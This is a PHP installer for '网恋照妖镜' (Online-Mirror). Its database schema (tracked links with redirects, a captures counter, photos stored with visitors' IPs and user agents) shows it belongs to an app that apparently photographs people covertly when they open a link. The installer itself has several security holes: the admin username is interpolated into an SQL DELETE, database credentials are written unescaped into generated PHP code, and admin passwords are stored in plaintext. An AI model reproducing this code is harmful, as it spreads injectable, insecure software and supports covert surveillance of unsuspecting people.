<?php
/**
 * Online-Mirror · 网恋照妖镜 - 安装程序
 * 
 * 引导用户配置数据库信息和后台管理员账户
 * 安装成功后自动删除本文件
 */

// 防止重复安装
if (file_exists(__DIR__ . '/config.php')) {
    require_once __DIR__ . '/config.php';
    if (isInstalled()) {
        // 已安装，直接删除安装程序
        @unlink(__FILE__);
        header('Location: index.php');
        exit;
    }
}

error_reporting(E_ALL);
ini_set('display_errors', 0);

$step = isset($_GET['step']) ? intval($_GET['step']) : 1;
$error = '';
$success = '';

// 环境检测
function checkEnv() {
    $checks = [];
    
    // PHP 版本
    $checks[] = [
        'name' => 'PHP 版本 >= 7.4',
        'pass' => version_compare(PHP_VERSION, '7.4', '>='),
        'info' => PHP_VERSION,
    ];
    
    // PDO 扩展
    $checks[] = [
        'name' => 'PDO 扩展',
        'pass' => extension_loaded('PDO'),
        'info' => extension_loaded('PDO') ? '✓' : '✗',
    ];
    
    // PDO MySQL 扩展
    $checks[] = [
        'name' => 'PDO_MySQL 扩展',
        'pass' => extension_loaded('pdo_mysql'),
        'info' => extension_loaded('pdo_mysql') ? '✓' : '✗',
    ];
    
    // GD 扩展
    $checks[] = [
        'name' => 'GD 扩展（图片处理）',
        'pass' => extension_loaded('gd'),
        'info' => extension_loaded('gd') ? '✓' : '✗',
    ];
    
    // FileInfo 扩展
    $checks[] = [
        'name' => 'FileInfo 扩展（安全检测）',
        'pass' => extension_loaded('fileinfo'),
        'info' => extension_loaded('fileinfo') ? '✓' : '✗',
    ];
    
    // 配置文件可写
    $config_writable = is_writable(__DIR__ . '/config.php');
    $checks[] = [
        'name' => 'config.php 可写',
        'pass' => $config_writable,
        'info' => $config_writable ? '✓' : '✗ (需 chmod 666)',
    ];
    
    // img 目录可写
    if (!file_exists(__DIR__ . '/img')) {
        @mkdir(__DIR__ . '/img', 0755, true);
    }
    $img_writable = is_writable(__DIR__ . '/img');
    $checks[] = [
        'name' => 'img/ 目录可写',
        'pass' => $img_writable,
        'info' => $img_writable ? '✓' : '✗ (需 chmod 777)',
    ];
    
    return $checks;
}

// 步骤2：写入配置
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $step === 2) {
    $db_host = trim($_POST['db_host'] ?? 'localhost');
    $db_user = trim($_POST['db_user'] ?? 'root');
    $db_pass = $_POST['db_pass'] ?? '';
    $db_name = trim($_POST['db_name'] ?? 'mirror');
    $admin_user = trim($_POST['admin_user'] ?? 'admin');
    $admin_pass = $_POST['admin_pass'] ?? '';
    $admin_pass2 = $_POST['admin_pass2'] ?? '';
    
    // 验证
    if (empty($db_host) || empty($db_user) || empty($db_name)) {
        $error = '请填写完整的数据库信息';
    } elseif (empty($admin_user) || empty($admin_pass)) {
        $error = '请填写管理员账号和密码';
    } elseif ($admin_pass !== $admin_pass2) {
        $error = '两次输入的密码不一致';
    } elseif (strlen($admin_pass) < 6) {
        $error = '管理员密码至少6位';
    } else {
        // 测试数据库连接
        try {
            $pdo = new PDO("mysql:host={$db_host};charset=utf8mb4", $db_user, $db_pass, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_TIMEOUT => 5,
            ]);
            
            // 创建数据库（如果不存在）
            $pdo->exec("CREATE DATABASE IF NOT EXISTS `{$db_name}` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
            $pdo->exec("USE `{$db_name}`");
            
            // 创建表
            $pdo->exec("
                CREATE TABLE IF NOT EXISTS users (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    username VARCHAR(50) UNIQUE NOT NULL,
                    password VARCHAR(255) NOT NULL,
                    role ENUM('admin','user') DEFAULT 'user',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
            ");
            
            $pdo->exec("
                CREATE TABLE IF NOT EXISTS links (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    link_id VARCHAR(50) UNIQUE NOT NULL,
                    redirect_url VARCHAR(1000) NOT NULL,
                    user_id INT DEFAULT NULL,
                    status ENUM('active','disabled','expired') DEFAULT 'active',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    expires_at DATETIME DEFAULT NULL,
                    views INT DEFAULT 0,
                    captures INT DEFAULT 0,
                    INDEX idx_link_id (link_id),
                    INDEX idx_user_id (user_id)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
            ");
            
            $pdo->exec("
                CREATE TABLE IF NOT EXISTS photos (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    link_id VARCHAR(50) NOT NULL,
                    file_path VARCHAR(500) NOT NULL,
                    ip_address VARCHAR(45) DEFAULT NULL,
                    user_agent TEXT DEFAULT NULL,
                    file_size INT DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    INDEX idx_link_id (link_id),
                    FOREIGN KEY (link_id) REFERENCES links(link_id) ON DELETE CASCADE
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
            ");
            
            $pdo->exec("
                CREATE TABLE IF NOT EXISTS logs (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    link_id VARCHAR(50) DEFAULT NULL,
                    action VARCHAR(50) NOT NULL,
                    ip_address VARCHAR(45) DEFAULT NULL,
                    user_agent TEXT DEFAULT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    INDEX idx_link_id (link_id),
                    INDEX idx_action (action)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
            ");
            
            // 插入管理员 - 先清空再插入确保干净
            $pdo->exec("DELETE FROM users WHERE username = '{$admin_user}'");
            $stmt = $pdo->prepare("INSERT INTO users (username, password, role) VALUES (?, ?, 'admin')");
            $stmt->execute([$admin_user, $admin_pass]);
            
            // 写入 config.php
            $config_content = '<?php' . "\n"
                . '/**' . "\n"
                . ' * Online-Mirror - 配置文件' . "\n"
                . ' * 由安装程序自动生成' . "\n"
                . ' */' . "\n"
                . "\n"
                . "define('DB_HOST', '{$db_host}');\n"
                . "define('DB_USER', '{$db_user}');\n"
                . "define('DB_PASS', '{$db_pass}');\n"
                . "define('DB_NAME', '{$db_name}');\n"
                . "\n"
                . "define('IMG_DIR', __DIR__ . '/img/');\n"
                . "define('SITE_URL', (isset(\$_SERVER['HTTPS']) && \$_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . \$_SERVER['HTTP_HOST'] . dirname(\$_SERVER['SCRIPT_NAME']) . '/');\n"
                . "\n"
                . "define('MAX_UPLOAD_SIZE', 5 * 1024 * 1024);\n"
                . "\n"
                . "if (!file_exists(IMG_DIR)) {\n"
                . "    @mkdir(IMG_DIR, 0755, true);\n"
                . "    @file_put_contents(IMG_DIR . 'index.html', '<!DOCTYPE html><html><head><title></title></head><body></body></html>');\n"
                . "}\n"
                . "\n"
                . "function getDB() {\n"
                . "    static \$pdo = null;\n"
                . "    if (\$pdo === null) {\n"
                . "        try {\n"
                . "            \$pdo = new PDO('mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4', DB_USER, DB_PASS, [\n"
                . "                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,\n"
                . "                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n"
                . "                PDO::ATTR_EMULATE_PREPARES => false,\n"
                . "            ]);\n"
                . "        } catch (PDOException \$e) {\n"
                . "            return null;\n"
                . "        }\n"
                . "    }\n"
                . "    return \$pdo;\n"
                . "}\n"
                . "\n"
                . "function isInstalled() {\n"
                . "    \$db = getDB();\n"
                . "    if (\$db === null) return false;\n"
                . "    try {\n"
                . "        \$stmt = \$db->query(\"SHOW TABLES LIKE 'users'\");\n"
                . "        return \$stmt->rowCount() > 0;\n"
                . "    } catch (Exception \$e) {\n"
                . "        return false;\n"
                . "    }\n"
                . "}\n"
                . "\n"
                . "function getClientIP() {\n"
                . "    \$ip = '';\n"
                . "    if (!empty(\$_SERVER['HTTP_X_FORWARDED_FOR'])) {\n"
                . "        \$ip = explode(',', \$_SERVER['HTTP_X_FORWARDED_FOR'])[0];\n"
                . "    } elseif (!empty(\$_SERVER['HTTP_CLIENT_IP'])) {\n"
                . "        \$ip = \$_SERVER['HTTP_CLIENT_IP'];\n"
                . "    } elseif (!empty(\$_SERVER['REMOTE_ADDR'])) {\n"
                . "        \$ip = \$_SERVER['REMOTE_ADDR'];\n"
                . "    }\n"
                . "    return filter_var(trim(\$ip), FILTER_VALIDATE_IP) ? \$ip : '0.0.0.0';\n"
                . "}\n"
                . "\n"
                . "function addLog(\$link_id, \$action) {\n"
                . "    try {\n"
                . "        \$db = getDB();\n"
                . "        if (\$db === null) return;\n"
                . "        \$stmt = \$db->prepare(\"INSERT INTO logs (link_id, action, ip_address, user_agent) VALUES (?, ?, ?, ?)\");\n"
                . "        \$stmt->execute([\$link_id, \$action, getClientIP(), \$_SERVER['HTTP_USER_AGENT'] ?? '']);\n"
                . "    } catch (Exception \$e) {}\n"
                . "}\n"
                . "\n"
                . "function generateID(\$length = 8) {\n"
                . "    \$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n"
                . "    \$id = '';\n"
                . "    for (\$i = 0; \$i < \$length; \$i++) {\n"
                . "        \$id .= \$chars[random_int(0, strlen(\$chars) - 1)];\n"
                . "    }\n"
                . "    return \$id;\n"
                . "}\n"
                . "\n"
                . "function isLoggedIn() {\n"
                . "    return isset(\$_SESSION['user_id']);\n"
                . "}\n"
                . "\n"
                . "function getCurrentUser() {\n"
                . "    if (!isset(\$_SESSION['user_id'])) return null;\n"
                . "    try {\n"
                . "        \$db = getDB();\n"
                . "        if (\$db === null) return null;\n"
                . "        \$stmt = \$db->prepare(\"SELECT id, username, role FROM users WHERE id = ?\");\n"
                . "        \$stmt->execute([\$_SESSION['user_id']]);\n"
                . "        return \$stmt->fetch();\n"
                . "    } catch (Exception \$e) {\n"
                . "        return null;\n"
                . "    }\n"
                . "}\n"
                . "\n"
                . "function requireLogin() {\n"
                . "    session_start();\n"
                . "    if (!isLoggedIn()) {\n"
                . "        header('Location: login.php');\n"
                . "        exit;\n"
                . "    }\n"
                . "}\n"
                . "\n"
                . "function formatSize(\$bytes) {\n"
                . "    if (\$bytes >= 1048576) return round(\$bytes / 1048576, 1) . ' MB';\n"
                . "    if (\$bytes >= 1024) return round(\$bytes / 1024, 1) . ' KB';\n"
                . "    return \$bytes . ' B';\n"
                . "}\n"
                . "?>";
            
            if (file_put_contents(__DIR__ . '/config.php', $config_content)) {
                // 安装成功，删除安装程序
                @unlink(__FILE__);
                $success = '🎉 安装成功！正在跳转...';
                echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="2;url=index.php"><title>安装成功</title><style>body{font-family:sans-serif;background:#0f0c29;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;}.box{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:24px;padding:40px;max-width:450px;}.emoji{font-size:64px;margin-bottom:16px;}h2{margin-bottom:8px;}p{color:#8080a0;}</style></head><body><div class="box"><div class="emoji">✅</div><h2>安装成功！</h2><p>正在跳转到主页...</p></div></body></html>';
                exit;
            } else {
                $error = '无法写入 config.php，请检查文件权限（需 chmod 666）';
            }
            
        } catch (PDOException $e) {
            $error = '数据库连接失败：' . $e->getMessage();
        }
    }
}

$env_checks = checkEnv();
$all_pass = true;
foreach ($env_checks as $c) {
    if (!$c['pass']) $all_pass = false;
}

?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>安装 · 网恋照妖镜</title>
<link rel="icon" type="image/x-icon" href="favicon.ico">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    color: #e0e0e0;
}
.container {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 24px;
    padding: 40px;
    max-width: 560px;
    width: 100%;
    box-shadow: 0 25px 50px rgba(0,0,0,0.5);
}
h1 {
    text-align: center;
    font-size: 26px;
    margin-bottom: 4px;
    background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.subtitle {
    text-align: center;
    color: #8080a0;
    font-size: 14px;
    margin-bottom: 28px;
}
.step-indicator {
    display: flex;
    justify-content: center;
    gap: 8px;
    margin-bottom: 24px;
}
.step-dot {
    width: 10px; height: 10px;
    border-radius: 50%;
    background: rgba(255,255,255,0.1);
    transition: all 0.3s;
}
.step-dot.active { background: #667eea; box-shadow: 0 0 10px rgba(102,126,234,0.5); }
.step-dot.done { background: #4caf50; }

/* 环境检测 */
.check-list { list-style: none; margin-bottom: 24px; }
.check-list li {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px 14px;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    font-size: 14px;
}
.check-list li .status { font-size: 12px; padding: 2px 8px; border-radius: 4px; }
.status-pass { background: rgba(76,175,80,0.15); color: #4caf50; }
.status-fail { background: rgba(255,80,80,0.15); color: #ff6b6b; }
.check-list li .info { color: #8080a0; font-size: 12px; }

/* 表单 */
.form-group {
    margin-bottom: 16px;
}
.form-group label {
    display: block;
    font-size: 13px;
    color: #a0a0b8;
    margin-bottom: 4px;
}
.form-group input {
    width: 100%;
    padding: 10px 14px;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 10px;
    background: rgba(255,255,255,0.06);
    color: #e0e0e0;
    font-size: 14px;
    outline: none;
    transition: all 0.3s;
}
.form-group input:focus {
    border-color: #667eea;
    box-shadow: 0 0 0 3px rgba(102,126,234,0.2);
}
.form-row {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
}
.section-title {
    font-size: 15px;
    font-weight: 600;
    margin: 20px 0 12px;
    padding-bottom: 8px;
    border-bottom: 1px solid rgba(255,255,255,0.06);
    color: #c0c0d0;
}
.btn {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 12px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
}
.btn-primary {
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
}
.btn-primary:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(102,126,234,0.4);
}
.btn-secondary {
    background: rgba(255,255,255,0.08);
    color: #a0a0b8;
    margin-top: 12px;
}
.btn-secondary:hover { background: rgba(255,255,255,0.12); }
.error {
    padding: 10px 14px;
    background: rgba(255,80,80,0.1);
    border: 1px solid rgba(255,80,80,0.2);
    border-radius: 10px;
    color: #ff6b6b;
    font-size: 13px;
    margin-bottom: 16px;
}
.success {
    padding: 10px 14px;
    background: rgba(76,175,80,0.1);
    border: 1px solid rgba(76,175,80,0.2);
    border-radius: 10px;
    color: #4caf50;
    font-size: 13px;
    margin-bottom: 16px;
}
@media (max-width: 480px) {
    .container { padding: 24px 16px; }
    .form-row { grid-template-columns: 1fr; }
}
</style>
</head>
<body>
<div class="container">
    <h1>🪞 网恋照妖镜</h1>
    <p class="subtitle">Online Mirror · 一键安装</p>

    <?php if ($error): ?>
    <div class="error">⚠️ <?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>

    <?php if ($success): ?>
    <div class="success"><?php echo $success; ?></div>
    <?php endif; ?>

    <!-- 步骤指示器 -->
    <div class="step-indicator">
        <div class="step-dot <?php echo $step >= 1 ? 'active' : ''; ?>"></div>
        <div class="step-dot <?php echo $step >= 2 ? 'active' : ($step > 1 ? 'done' : ''); ?>"></div>
    </div>

    <?php if ($step === 1): ?>
    <!-- 步骤1：环境检测 -->
    <ul class="check-list">
        <?php foreach ($env_checks as $c): ?>
        <li>
            <span><?php echo htmlspecialchars($c['name']); ?></span>
            <span>
                <span class="status <?php echo $c['pass'] ? 'status-pass' : 'status-fail'; ?>">
                    <?php echo $c['pass'] ? '正常' : '异常'; ?>
                </span>
                <span class="info"><?php echo htmlspecialchars($c['info']); ?></span>
            </span>
        </li>
        <?php endforeach; ?>
    </ul>

    <?php if ($all_pass): ?>
    <form method="get" action="install.php">
        <input type="hidden" name="step" value="2">
        <button type="submit" class="btn btn-primary">环境正常，下一步 →</button>
    </form>
    <?php else: ?>
    <p style="text-align:center;color:#ff6b6b;font-size:13px;margin-bottom:12px;">
        请修复以上异常后刷新页面重试
    </p>
    <button class="btn btn-secondary" onclick="location.reload()">重新检测</button>
    <?php endif; ?>

    <?php elseif ($step === 2): ?>
    <!-- 步骤2：配置信息 -->
    <form method="post" action="install.php?step=2" onsubmit="return validateForm()">

        <div class="section-title">📦 数据库配置</div>
        
        <div class="form-row">
            <div class="form-group">
                <label>数据库主机</label>
                <input type="text" name="db_host" value="localhost" required>
            </div>
            <div class="form-group">
                <label>数据库名</label>
                <input type="text" name="db_name" value="mirror" required>
            </div>
        </div>

        <div class="form-row">
            <div class="form-group">
                <label>数据库用户名</label>
                <input type="text" name="db_user" value="root" required>
            </div>
            <div class="form-group">
                <label>数据库密码</label>
                <input type="password" name="db_pass" placeholder="无密码留空">
            </div>
        </div>

        <div class="section-title">🔐 管理员账户</div>

        <div class="form-row">
            <div class="form-group">
                <label>管理员用户名</label>
                <input type="text" name="admin_user" value="admin" required>
            </div>
            <div class="form-group">
                <label></label>
                <span></span>
            </div>
        </div>

        <div class="form-row">
            <div class="form-group">
                <label>管理员密码</label>
                <input type="password" name="admin_pass" required minlength="6">
            </div>
            <div class="form-group">
                <label>确认密码</label>
                <input type="password" name="admin_pass2" required minlength="6">
            </div>
        </div>

        <button type="submit" class="btn btn-primary" style="margin-top:8px;">
            <i class="fas fa-rocket"></i> 开始安装
        </button>
    </form>
    <?php endif; ?>
</div>

<script>
function validateForm() {
    var p1 = document.querySelector('input[name="admin_pass"]').value;
    var p2 = document.querySelector('input[name="admin_pass2"]').value;
    if (p1 !== p2) {
        alert('两次输入的密码不一致！');
        return false;
    }
    if (p1.length < 6) {
        alert('管理员密码至少6位！');
        return false;
    }
    return true;
}
</script>
</body>
</html>
